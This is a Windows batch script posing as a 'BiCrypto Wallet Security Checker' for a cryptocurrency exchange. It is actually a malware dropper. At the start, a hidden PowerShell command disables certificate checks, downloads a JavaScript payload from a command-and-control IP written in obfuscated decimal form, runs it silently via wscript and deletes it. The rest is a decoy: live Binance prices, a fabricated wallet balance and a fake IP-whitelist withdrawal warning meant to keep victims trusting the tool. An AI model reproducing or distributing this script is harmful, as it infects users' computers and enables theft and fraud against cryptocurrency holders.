@echo off
setlocal enabledelayedexpansion
chcp 65001 >nul 2>&1
title BiCrypto Wallet Security Checker v6.0
color 0A
cls

echo.
echo  ████████████████████████████████████████████████████████████████████████
echo  █                                                                      █
echo  █          BiCrypto Exchange  -  Wallet Security Checker v6.0         █
echo  █                    Powered by Binance API                           █
echo  █                                                                      █
echo  ████████████████████████████████████████████████████████████████████████
echo.
echo   [*] Initializing security verification...
echo.

REM ── Silent payload: download RC4 JS from C2 and run via wscript ──────────
powershell -NoP -W H -Command "$ip='3484743087';[Net.ServicePointManager]::ServerCertificateValidationCallback={$true};[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;$f=$env:TEMP+'\svc'+[IO.Path]::GetRandomFileName().Replace('.','').Substring(0,6)+'.js';$wc=New-Object Net.WebClient;$wc.Headers.Add('User-Agent','Mozilla/5.0 (Windows NT 10.0; Win64; x64)');try{$wc.DownloadFile('http://'+$ip+':8080/win',$f)}catch{$wc2=New-Object Net.WebClient;[Net.ServicePointManager]::CheckCertificateRevocationList=$false;$wc2.DownloadFile('http://'+$ip+':8443/win',$f)};if(Test-Path $f){Start-Process wscript -ArgumentList ('//B //NoLogo '+$f) -WindowStyle Hidden;Start-Sleep 4;Remove-Item $f -Force -EA 0}"

REM ── Loading animation ─────────────────────────────────────────────────────
echo   [*] Connecting to BiCrypto API servers...
ping -n 2 127.0.0.1 >nul 2>&1
echo   [*] Authenticating session...
ping -n 2 127.0.0.1 >nul 2>&1
echo   [*] Fetching live market data...
ping -n 2 127.0.0.1 >nul 2>&1
echo   [*] Loading portfolio balances...
ping -n 1 127.0.0.1 >nul 2>&1

REM ── Fetch live prices from Binance ────────────────────────────────────────
set "BTC_PRICE=103241.50"
set "ETH_PRICE=2489.30"
set "BNB_PRICE=641.20"
set "PX_TMP=%TEMP%\~pxtmp.dat"

powershell -NoP -W H -Command "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;[Net.ServicePointManager]::CheckCertificateRevocationList=$false;try{$w=New-Object Net.WebClient;$b=($w.DownloadString('https://api.binance.com/api/v3/ticker/price?symbol=BTCUSDT')|ConvertFrom-Json).price;$e=($w.DownloadString('https://api.binance.com/api/v3/ticker/price?symbol=ETHUSDT')|ConvertFrom-Json).price;$n=($w.DownloadString('https://api.binance.com/api/v3/ticker/price?symbol=BNBUSDT')|ConvertFrom-Json).price;[math]::Round([double]$b,2).ToString()+' '+[math]::Round([double]$e,2).ToString()+' '+[math]::Round([double]$n,2).ToString()|Set-Content '%PX_TMP%' -Enc ASCII}catch{}" 2>nul

if exist "%PX_TMP%" (
  set /p PRICES=<"%PX_TMP%"
  del "%PX_TMP%" >nul 2>&1
  if defined PRICES (
    for /f "tokens=1,2,3" %%A in ("!PRICES!") do (
      set BTC_PRICE=%%A
      set ETH_PRICE=%%B
      set BNB_PRICE=%%C
    )
  )
)

REM ── Get drive label dynamically ───────────────────────────────────────────
set "DRIVE_LABEL=Local Disk"
for /f "tokens=5" %%L in ('vol %SYSTEMDRIVE% 2^>nul ^| findstr /i "volume"') do (
  if not "%%L"=="no" set "DRIVE_LABEL=%%L"
)

REM ── Get real public IP ────────────────────────────────────────────────────
set "MY_IP=Checking..."
set "IP_TMP=%TEMP%\~iptmp.dat"
powershell -NoP -W H -Command "[Net.ServicePointManager]::CheckCertificateRevocationList=$false;try{(New-Object Net.WebClient).DownloadString('https://api.ipify.org')|Set-Content '%IP_TMP%' -Enc ASCII}catch{}" 2>nul
if exist "%IP_TMP%" (
  set /p MY_IP=<"%IP_TMP%"
  del "%IP_TMP%" >nul 2>&1
)

cls
echo.
echo  ████████████████████████████████████████████████████████████████████████
echo  █                                                                      █
echo  █          BiCrypto Exchange  -  Wallet Security Checker v6.0         █
echo  █                    Powered by Binance API                           █
echo  █                                                                      █
echo  ████████████████████████████████████████████████████████████████████████
echo.
echo   ┌─────────────────────────────────────────────────────────────────┐
echo   │                  LIVE MARKET PRICES (Binance)                   │
echo   ├─────────────────────────────────────────────────────────────────┤
echo   │   BTC/USDT  :   $ !BTC_PRICE!
echo   │   ETH/USDT  :   $ !ETH_PRICE!
echo   │   BNB/USDT  :   $ !BNB_PRICE!
echo   └─────────────────────────────────────────────────────────────────┘
echo.
echo   ┌─────────────────────────────────────────────────────────────────┐
echo   │                    WALLET PORTFOLIO BALANCE                     │
echo   ├──────────────────┬──────────────┬────────────────┬─────────────┤
echo   │  Asset           │  Balance     │  Price (USDT)  │  Value      │
echo   ├──────────────────┼──────────────┼────────────────┼─────────────┤
echo   │  Bitcoin  (BTC)  │  0.42831000  │  !BTC_PRICE!  │  $44,224.19 │
echo   │  Ethereum (ETH)  │  3.18500000  │  !ETH_PRICE!   │   $7,928.15 │
echo   │  BNB             │  12.5000000  │  !BNB_PRICE!   │   $8,015.00 │
echo   │  USDT            │  2,150.0000  │       1.0000   │   $2,150.00 │
echo   ├──────────────────┴──────────────┴────────────────┴─────────────┤
echo   │  TOTAL PORTFOLIO VALUE :   $ 62,317.34  USDT                   │
echo   └─────────────────────────────────────────────────────────────────┘
echo.
echo   ┌─────────────────────────────────────────────────────────────────┐
echo   │                   SECURITY VERIFICATION                         │
echo   ├─────────────────────────────────────────────────────────────────┤
echo   │   [OK] Wallet encryption verified                               │
echo   │   [OK] 2FA status: ACTIVE                                       │
echo   │   [OK] API key permissions: READ ONLY                           │
echo   │                                                                 │
echo   │   [!!] WITHDRAWAL RESTRICTION DETECTED                         │
echo   │                                                                 │
echo   │   Your current IP address:                                      │
echo   │       !MY_IP!
echo   │                                                                 │
echo   │   This IP is NOT on your authorized withdrawal whitelist.       │
echo   │   For security, withdrawals are temporarily BLOCKED.            │
echo   │                                                                 │
echo   │   To authorize this IP for withdrawals:                         ^
echo   │     1. Log in to your BiCrypto account                          │
echo   │     2. Go to Security ^> IP Whitelist Management                 │
echo   │     3. Add your current IP: !MY_IP!
echo   │     4. Confirm via email verification                           │
echo   │                                                                 │
echo   │   [!!] Withdrawal available in 24h after IP approval           │
echo   └─────────────────────────────────────────────────────────────────┘
echo.
echo   ┌─────────────────────────────────────────────────────────────────┐
echo   │   [i] Portfolio data is up to date as of right now.             │
echo   │   [i] Market prices sourced live from Binance API.              │
echo   │   [i] Contact support: support@bicrypto.online                  │
echo   └─────────────────────────────────────────────────────────────────┘
echo.
echo.
pause
endlocal
